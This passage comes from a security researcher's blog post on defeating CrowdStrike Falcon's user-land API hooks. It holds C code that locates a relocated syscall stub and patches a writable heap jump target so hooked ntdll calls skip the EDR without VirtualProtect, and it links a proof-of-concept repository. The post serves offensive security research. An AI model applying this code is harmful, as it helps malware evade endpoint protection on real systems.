</span></span></span><span style=display:flex><span><span style=color:#75715e></span>                <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> backCounter <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>; backCounter <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>100</span>; backCounter<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span> (
</span></span><span style=display:flex><span>                        <span style=color:#f92672>*</span>((BYTE <span style=color:#f92672>*</span>) finalJmpAddr <span style=color:#f92672>-</span> backCounter) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x4c</span> <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>*</span>((BYTE <span style=color:#f92672>*</span>) ((finalJmpAddr <span style=color:#f92672>-</span> backCounter) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x8b</span> <span style=color:#f92672>&amp;&amp;</span>
</span></span><span style=display:flex><span>                        <span style=color:#f92672>*</span>((BYTE <span style=color:#f92672>*</span>) ((finalJmpAddr <span style=color:#f92672>-</span> backCounter) <span style=color:#f92672>+</span> <span style=color:#ae81ff>2</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xd1</span>
</span></span><span style=display:flex><span>                    ) { 
</span></span><span style=display:flex><span>                        <span style=color:#f92672>*</span>unhookAddr <span style=color:#f92672>=</span> (BYTE <span style=color:#f92672>*</span>) finalJmpAddr <span style=color:#f92672>-</span> backCounter;
</span></span><span style=display:flex><span>                        
</span></span><span style=display:flex><span>                        WORD syscallID <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>(WORD <span style=color:#f92672>*</span>)((BYTE <span style=color:#f92672>*</span>) ((finalJmpAddr <span style=color:#f92672>-</span> backCounter) <span style=color:#f92672>+</span> <span style=color:#ae81ff>4</span>));
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>return</span> syscallID;
</span></span><span style=display:flex><span>                    }
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> NULL;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=where-can-we-patch>Where can we patch?<a hidden class=anchor aria-hidden=true href=#where-can-we-patch>#</a></h2><p>So hopefully now we know the address of the relocated stub. But what can we actually patch in order to jump there? Back in the Signal Labs post, they simply mention &ldquo;replacing the hooks from the EDR/AV with our own hook.&rdquo; In my case though, I found that this wasn&rsquo;t possible. The initial hooks are located in the <code>.text</code> section of <code>ntdll.dll</code>, which isn&rsquo;t writable without calling <code>VirtualProtect</code> first. The existing hooks were also <code>E9</code> near jumps, which wouldn&rsquo;t put us in range of our relocated stub, and I don&rsquo;t believe we would be able to patch in a far jump without mangling surrounding instructions.</p><p>Well, what about second <code>jmp</code> the hook goes to? That one is a far jump. Again though, this is still located inside the <code>.text</code> section of <code>ntdll.dll</code> and isn&rsquo;t writable. The third <code>jmp</code> after this is located inside the Falcon DLL itself, and also isn&rsquo;t writable, as well as being a short jump. The fourth jump is interesting though - it is also located in the DLL <code>.text</code> section, so isn&rsquo;t directly writable, but it&rsquo;s jumping to a register, <code>r10</code>, and as we briefly covered early, this register is filled with a value from memory that undergoes some modification before being jumped to.</p><p><img loading=lazy src=/third_jmp_landing.png#center alt=third-jmp-landing></p><p>Let&rsquo;s cover again what&rsquo;s happening at this point:</p><ol><li>After following the first <code>jmp</code> in the hook, we land amongst some <code>push rcx</code> instructions. Through testing, I found that different function hooks land in different places in the series of <code>push rcx</code> instructions, varying the final address they jump to.</li><li>We then <code>jmp</code> again to a few instructions where <code>r10</code> is filled with a value from memory, and then is XOR&rsquo;d with another value from memory. The resulting value is an address that is generally somewhere in some heap memory of the Falcon DLL.</li><li>We <code>jmp</code> again and land in a loop, showed in the image above. This loop performs one iteration for every <code>rcx</code> value that was pushed to the stack after the first <code>jmp</code>. For every iteration of the loop, the value <code>0x45</code> is added to the address in <code>r10</code>.</li><li>At the end of the loop, we <code>jmp</code> to <code>r10 + 0x28</code>.</li></ol><p>The final memory address that is loaded into the <code>jmp</code> is a section of heap memory, and happens to be writable. We can therefore work out where this address is by programmatically performing the steps listed above, writing our relocated stub address to the address we calculate, and the <code>jmp r10 + 0x28</code> will naturally jump to the relocated stub, load the SSN into <code>eax</code>, and jump back to after the hook.</p><p>Our function needs to:</p><ol><li>Follow the first <code>jmp</code></li><li>Count how many <code>push rcx</code> are performed</li><li>Follow the second <code>jmp</code></li><li>Perform the XOR between the two values to get our initial stack address</li><li>Add <code>0x45</code> for however many <code>push rcx</code> we counted</li><li>Add <code>0x28</code> to account for the final addition in the jump</li><li>Write the address we found for the relocated stub to here</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>BOOL <span style=color:#a6e22e>PatchHeapAddr</span>(BYTE <span style=color:#f92672>*</span> landingAddr, VOID <span style=color:#f92672>*</span> targetAddr) {
</span></span><span style=display:flex><span>    DWORD_PTR <span style=color:#f92672>*</span> patchAddr <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    BYTE <span style=color:#f92672>*</span> nextLanding <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    BYTE <span style=color:#f92672>*</span> nextInstruction <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    BYTE <span style=color:#f92672>*</span> initialHeapAddr <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    VOID <span style=color:#f92672>*</span> xorAddr1 <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    VOID <span style=color:#f92672>*</span> xorAddr2 <span style=color:#f92672>=</span> NULL;
</span></span><span style=display:flex><span>    DWORD offset <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> stackValCounter <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Count how many pushes to the stack are made before the jump
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>while</span> (<span style=color:#f92672>*</span>landingAddr <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x51</span>) {
</span></span><span style=display:flex><span>        stackValCounter<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>        landingAddr<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    nextLanding <span style=color:#f92672>=</span> <span style=color:#a6e22e>ResolveJmp</span>(landingAddr, NULL);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (nextLanding <span style=color:#f92672>==</span> NULL) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> FALSE;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Find the starting value of the heap address, pre-modification by the loop
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// To do this we find the value moved into r10. This is the address of the next instruction + an offset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    offset <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((DWORD <span style=color:#f92672>*</span>) (nextLanding <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>));
</span></span><span style=display:flex><span>    nextInstruction <span style=color:#f92672>=</span> nextLanding <span style=color:#f92672>+</span> <span style=color:#ae81ff>7</span>;
</span></span><span style=display:flex><span>    xorAddr1 <span style=color:#f92672>=</span> (VOID <span style=color:#f92672>*</span>) <span style=color:#f92672>*</span>((DWORDLONG <span style=color:#f92672>*</span>) (nextInstruction <span style=color:#f92672>+</span> offset));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// We then find the next value, which will be XOR&#39;d with the first. We skip an instruction in the middle which isn&#39;t used in resolving the address.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>// Then it is also a case of the next instruction + an offset
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    nextInstruction <span style=color:#f92672>=</span> nextInstruction <span style=color:#f92672>+</span> <span style=color:#ae81ff>6</span>;
</span></span><span style=display:flex><span>    offset <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((DWORD <span style=color:#f92672>*</span>) (nextInstruction <span style=color:#f92672>+</span> <span style=color:#ae81ff>3</span>));
</span></span><span style=display:flex><span>    nextInstruction <span style=color:#f92672>=</span> nextInstruction <span style=color:#f92672>+</span> <span style=color:#ae81ff>7</span>;
</span></span><span style=display:flex><span>    xorAddr2 <span style=color:#f92672>=</span> (VOID <span style=color:#f92672>*</span>) <span style=color:#f92672>*</span>((DWORDLONG <span style=color:#f92672>*</span>) (nextInstruction <span style=color:#f92672>+</span> offset));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// XORing the two values gives us the initial address on the heap, before any modifications
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    initialHeapAddr <span style=color:#f92672>=</span> ((DWORDLONG) xorAddr1) <span style=color:#f92672>^</span> ((DWORDLONG) xorAddr2);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// We then perform the same actions the loop does, adding 0x45 for each value previously pushed to the stack, and adding 0x28 on the end.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    patchAddr <span style=color:#f92672>=</span> initialHeapAddr <span style=color:#f92672>+</span> (<span style=color:#ae81ff>0x45</span> <span style=color:#f92672>*</span> (stackValCounter)) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x28</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>patchAddr <span style=color:#f92672>=</span> targetAddr;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TRUE;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>And at this point, we should have successfully unhooked the function without using <code>VirtualProtect</code>.</p><p>As mentioned already, this is obviously incredibly brittle because it&rsquo;s reversing a specific piece of obfuscation where any of the hardcoded values could easily change. We could dynamically resolve the value added in the loops and the final jump, in case it was changed. Obligatory mention that nowadays of course user-land API hooking is just one part of the picture for modern EDRs, and isn&rsquo;t going to be sufficient for evasion on its own. Another note is that this has only been tested on a couple of different instances of Falcon but all within the same organisation - it may well be the case that the hardcoded values used to unhook actually differ in different deployments.</p><h3 id=demo-and-code>Demo and code<a hidden class=anchor aria-hidden=true href=#demo-and-code>#</a></h3><p>Here&rsquo;s a video demo where the unhooking is performed, and execution is stepped through with a debugger to confirm that the unhook works. Link to PoC repo: <a href=https://github.com/inb1ts/birdnet-poc target=_blank rel=noopener>https://github.com/inb1ts/birdnet-poc</a></p><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe src=https://www.youtube.com/embed/SCA8bk3FTp0 style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 allowfullscreen title="YouTube Video"></iframe></div></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=next href=https://inbits-sec.com/posts/oscp-prep-tips/><span class=title>Next »</span><br><span>My OSCP Preparation Tips</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2023 <a href=https://inbits-sec.com/>Inbits Blog</a></span>
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>